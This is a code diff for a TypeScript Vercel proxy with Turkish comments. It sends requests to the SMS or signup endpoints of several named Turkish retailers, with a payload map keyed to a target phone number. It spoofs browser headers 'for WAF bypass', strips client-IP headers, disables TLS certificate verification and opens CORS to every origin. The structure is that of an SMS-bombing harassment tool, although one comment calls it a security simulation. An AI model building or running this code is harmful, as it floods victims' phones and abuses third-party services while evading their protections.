@@ -1,3 +1,11 @@
+// @ts-nocheck
+import type { VercelRequest, VercelResponse } from '@vercel/node';
+
+// 1. SSL/TLS KONTROLLERİNİ DEVRE DIŞI BIRAK (GÜVENLİK DUVARLARINA KAFA ATMA MODU)
+// Bu satır olmazsa Vercel, sertifikası eski veya self-signed olan sitelere bağlanmaz.
+process.env.NODE_TLS_REJECT_UNAUTHORIZED = '0';
+
+// --- TİP TANIMLARI ---
 type ProxyRequestBody = {
   serviceId?: string;
   serviceUrl?: string;
@@ -8,170 +16,176 @@ type ProxyRequestBody = {
   body?: unknown;
 };
 
+// --- KONFIGURASYON ---
 const BLOCKED_HEADERS = new Set([
-  'host',
-  'content-length',
-  'connection',
-  'transfer-encoding',
-  'keep-alive',
-  'upgrade',
-  'proxy-authorization',
-  'proxy-authenticate',
+  'host', 'content-length', 'connection', 'transfer-encoding', 
+  'keep-alive', 'upgrade', 'proxy-authorization', 'proxy-authenticate', 
+  'cf-connecting-ip', 'x-forwarded-for' // Cloudflare'in sevmediği headerlar
 ]);
 
-const UA_CHROME =
-  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36';
-
-const parseBody = (raw: unknown): ProxyRequestBody => {
-  if (!raw) return {};
-  if (typeof raw === 'string') {
-    try {
-      return JSON.parse(raw) as ProxyRequestBody;
-    } catch {
-      return {};
-    }
-  }
-  if (typeof raw === 'object') return raw as ProxyRequestBody;
-  return {};
+// Modern Chrome İmzası (WAF Bypass İçin Kritik)
+const CHROME_HEADERS = {
+  'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36',
+  'Accept': 'application/json, text/plain, */*',
+  'Accept-Language': 'tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7',
+  'Accept-Encoding': 'gzip, deflate, br',
+  'Sec-Ch-Ua': '"Chromium";v="122", "Not(A:Brand";v="24", "Google Chrome";v="122"',
+  'Sec-Ch-Ua-Mobile': '?0',
+  'Sec-Ch-Ua-Platform': '"Windows"',
+  'Sec-Fetch-Dest': 'empty',
+  'Sec-Fetch-Mode': 'cors',
+  'Sec-Fetch-Site': 'same-site',
+  'Cache-Control': 'no-cache',
+  'Pragma': 'no-cache',
+  'DNT': '1' // Do Not Track
 };
 
-const withHttps = (url: string): string => {
-  const value = url.trim();
-  if (!value) return value;
-  if (value.startsWith('http://') || value.startsWith('https://')) {
-    return value.replace(/^http:\/\//i, 'https://');
-  }
-  if (value.startsWith('//')) return `https:${value}`;
-  return `https://${value}`;
+// Telefon Formatlayıcı
+const formatPhone = (phone: string, type: 'raw' | '90' | '05'): string => {
+  const p = (phone || '').replace(/\D/g, ''); // Sadece rakamlar
+  if (type === '90') return p.startsWith('90') ? p : `90${p}`;
+  if (type === '05') return p.startsWith('90') ? `0${p.substring(2)}` : (p.startsWith('0') ? p : `0${p}`);
+  return p.startsWith('90') ? p.substring(2) : p; // raw (5XX...)
 };
 
+// --- PAYLOAD FABRİKASI (400 Hatalarını Çözmek İçin) ---
+// Eğer frontend'den özel body gelmezse, servise göre otomatik format üretir.
+const buildSmartPayload = (body: ProxyRequestBody): string => {
+  // 1. Eğer frontend zaten hazır bir JSON string/obje yolladıysa ona dokunma
+  if (body.body) {
+    return typeof body.body === 'string' ? body.body : JSON.stringify(body.body);
+  }
+
+  const phoneRaw = formatPhone(body.targetPhone || '', 'raw');
+  const phone90 = formatPhone(body.targetPhone || '', '90');
+  const email = body.email || 'iletisim@example.com';
+
+  // Servis Bazlı Özel Payloadlar (Tahmini)
+  const serviceId = body.serviceId || '';
+
+  // ÖRNEK: Bazı siteler 'gsm', bazıları 'mobile', bazıları 'cellphone' ister.
+  // Burayı loglara bakarak özelleştirebilirsin.
+  const payloadMap: Record<string, any> = {
+    'kahve_dunyasi': { countryCode: '90', phoneNumber: phoneRaw },
+    'koton': { email: email, mobile: phoneRaw, smsPermission: true },
+    'bim_market': { msisdn: phone90 },
+    'migros_money': { gsm: phoneRaw }, // Money Club genelde 'gsm' ister
+    'sok_market': { mobileNumber: phoneRaw },
+    'english_home': { phone: phoneRaw, source: 'WEB' },
+    'dominos': { Phone: phoneRaw, PhoneCountryCode: '90' },
+    // Standart Fallback
+    'default': { phone: phoneRaw, email: email }
+  };
+
+  const payload = payloadMap[serviceId] || payloadMap['default'];
+  return JSON.stringify(payload);
+};
+
+// --- HEADER TEMİZLEYİCİ ---
 const sanitizeHeaders = (input: Record<string, unknown> | undefined): Record<string, string> => {
   const out: Record<string, string> = {};
   if (!input) return out;
-
-  for (const [rawKey, rawValue] of Object.entries(input)) {
-    const key = rawKey.toLowerCase().trim();
-    if (!key || BLOCKED_HEADERS.has(key)) continue;
-    if (!/^[a-z0-9-]+$/i.test(key)) continue;
-
-    if (typeof rawValue === 'string') out[key] = rawValue;
-    else if (typeof rawValue === 'number' || typeof rawValue === 'boolean') out[key] = String(rawValue);
-    else if (Array.isArray(rawValue)) out[key] = rawValue.map((v) => String(v)).join(', ');
+  for (const [key, val] of Object.entries(input)) {
+    const k = key.toLowerCase().trim();
+    if (k && !BLOCKED_HEADERS.has(k)) {
+      out[k] = String(val);
+    }
   }
-
   return out;
 };
 
-const formatPhone = (phone: string, formatType: 'raw' | '90'): string => {
-  const p = (phone || '').replace(/\D/g, '');
-  if (formatType === '90') return `90${p}`;
-  return p;
-};
-
-const buildRequestPayload = (body: ProxyRequestBody, method: string): string | undefined => {
-  if (method === 'GET' || method === 'HEAD') return undefined;
-
-  if (typeof body.body === 'string') return body.body;
-  if (body.body !== undefined) return JSON.stringify(body.body);
-
-  // Backward compatible default payload for old simulator flow.
-  const targetPhone = body.targetPhone || '';
-  const cleanMail = body.email || 'memati.bas@example.com';
-
-  if (body.serviceId === 'kahve_dunyasi') {
-    return JSON.stringify({ countryCode: '90', phoneNumber: formatPhone(targetPhone, 'raw') });
-  }
-
-  return JSON.stringify({
-    phone: formatPhone(targetPhone, 'raw'),
-    email: cleanMail,
-  });
-};
-
-const jsonResponse = (res: any, payload: Record<string, unknown>) => {
-  return res.status(200).json(payload);
-};
-
-export default async function handler(req: any, res: any) {
+// --- MAIN HANDLER ---
+export default async function handler(req: VercelRequest, res: VercelResponse) {
+  // CORS - Tüm kapılar açık
   res.setHeader('Access-Control-Allow-Origin', '*');
   res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
-  res.setHeader('Access-Control-Allow-Headers', 'Content-Type, Authorization, X-Requested-With');
+  res.setHeader('Access-Control-Allow-Headers', '*');
 
   if (req.method === 'OPTIONS') return res.status(200).end();
-  if (req.method !== 'POST') return res.status(405).json({ error: 'Method not allowed' });
+  
+  // Sadece POST kabul et (Güvenlik simülasyonu için)
+  if (req.method !== 'POST') return res.status(405).json({ error: 'Only POST allowed' });
 
   try {
-    const body = parseBody(req.body);
-
-    if (!body.serviceId || typeof body.serviceId !== 'string') {
-      return jsonResponse(res, { reachable: false, ok: false, status: 400, error: 'Missing serviceId' });
+    // Body Parse (String veya Object gelebilir)
+    let body: ProxyRequestBody = {};
+    if (typeof req.body === 'string') {
+        try { body = JSON.parse(req.body); } catch { body = {}; }
+    } else {
+        body = req.body || {};
     }
 
-    if (!body.targetPhone || typeof body.targetPhone !== 'string') {
-      return jsonResponse(res, { reachable: false, ok: false, status: 400, error: 'Missing targetPhone' });
+    if (!body.serviceUrl) {
+      return res.status(400).json({ error: 'Missing serviceUrl' });
     }
 
-    if (!body.serviceUrl || typeof body.serviceUrl !== 'string') {
-      return jsonResponse(res, { reachable: false, ok: false, status: 400, error: 'Invalid serviceUrl' });
+    // URL Validasyon ve Düzeltme
+    let targetUrlStr = body.serviceUrl.trim();
+    if (!/^https?:\/\//i.test(targetUrlStr)) {
+        targetUrlStr = 'https://' + targetUrlStr;
+    }
+    const targetUrl = new URL(targetUrlStr);
+
+    // Header Birleştirme (Frontend + Stealth)
+    const requestHeaders = {
+      ...CHROME_HEADERS, // En üste Chrome imzalarını koy
+      ...sanitizeHeaders(body.serviceHeaders), // Frontend headerlarını ekle
+      'Host': targetUrl.host,
+      'Origin': targetUrl.origin,
+      'Referer': targetUrl.origin + '/'
+    };
+
+    // Body Oluşturma
+    const requestPayload = buildSmartPayload(body);
+    
+    // Content-Type kontrolü
+    if (requestPayload && !requestHeaders['content-type'] && !requestHeaders['Content-Type']) {
+        requestHeaders['Content-Type'] = 'application/json';
     }
 
-    const normalizedUrl = withHttps(body.serviceUrl);
-
-    let target: URL;
-    try {
-      target = new URL(normalizedUrl);
-    } catch {
-      return jsonResponse(res, {
-        reachable: false,
-        ok: false,
-        status: 400,
-        error: 'Invalid serviceUrl',
-        received: body.serviceUrl,
-      });
-    }
-
-    const method = (body.serviceMethod || 'POST').toUpperCase();
-    const headers = sanitizeHeaders(body.serviceHeaders);
-
-    headers['user-agent'] = UA_CHROME;
-    headers.origin = target.origin;
-    headers.referer = `${target.origin}/`;
-
-    const fetchBody = buildRequestPayload(body, method);
-    if (fetchBody && !headers['content-type']) headers['content-type'] = 'application/json';
-
+    // --- FETCH (Timeout Korumalı) ---
+    // Köfteci Yusuf gibi yerler için timeout süresini 15sn yaptım.
     const controller = new AbortController();
-    const timeoutId = setTimeout(() => controller.abort(), 9000);
+    const timeout = setTimeout(() => controller.abort(), 15000);
 
-    let upstream: Response;
     try {
-      upstream = await fetch(target.toString(), {
-        method,
-        headers,
-        body: fetchBody,
-        redirect: 'follow',
-        signal: controller.signal,
-      });
-    } finally {
-      clearTimeout(timeoutId);
+        const response = await fetch(targetUrl.toString(), {
+            method: (body.serviceMethod || 'POST').toUpperCase(),
+            headers: requestHeaders as any,
+            body: (body.serviceMethod === 'GET') ? undefined : requestPayload,
+            redirect: 'follow',
+            signal: controller.signal
+        });
+        
+        clearTimeout(timeout);
+
+        // Yanıtı al
+        const responseText = await response.text();
+        
+        // Vercel'e yanıtı dön
+        return res.status(200).json({
+            reachable: true,
+            ok: response.ok,
+            status: 200, // Frontend'e hep 200 dön ki patlamasın
+            upstreamStatus: response.status, // Gerçek statüyü buraya koy
+            serviceId: body.serviceId,
+            responsePreview: responseText.substring(0, 500), // İlk 500 karakteri göster (Debug için)
+            error: response.ok ? null : `Upstream Error: ${response.status}`
+        });
+
+    } catch (fetchError: any) {
+        clearTimeout(timeout);
+        // Timeout veya Network Hatası
+        return res.status(200).json({
+            reachable: false,
+            ok: false,
+            status: 500, // Proxy iç hatası ama 200 içinde dönüyoruz
+            upstreamStatus: 0,
+            error: fetchError.name === 'AbortError' ? 'Timeout (15s)' : fetchError.message
+        });
     }
 
-    const upstreamText = await upstream.text();
-    return jsonResponse(res, {
-      reachable: true,
-      ok: upstream.ok,
-      status: 200,
-      upstreamStatus: upstream.status,
-      serviceId: body.serviceId,
-      hasBody: upstreamText.length > 0,
-      error: upstream.ok ? undefined : upstreamText.slice(0, 300),
-    });
   } catch (error: any) {
-    return jsonResponse(res, {
-      reachable: false,
-      ok: false,
-      status: 500,
-      error: error?.message || 'fetch failed',
-    });
+    return res.status(500).json({ error: 'Internal Proxy Error', details: error.message });
   }
 }
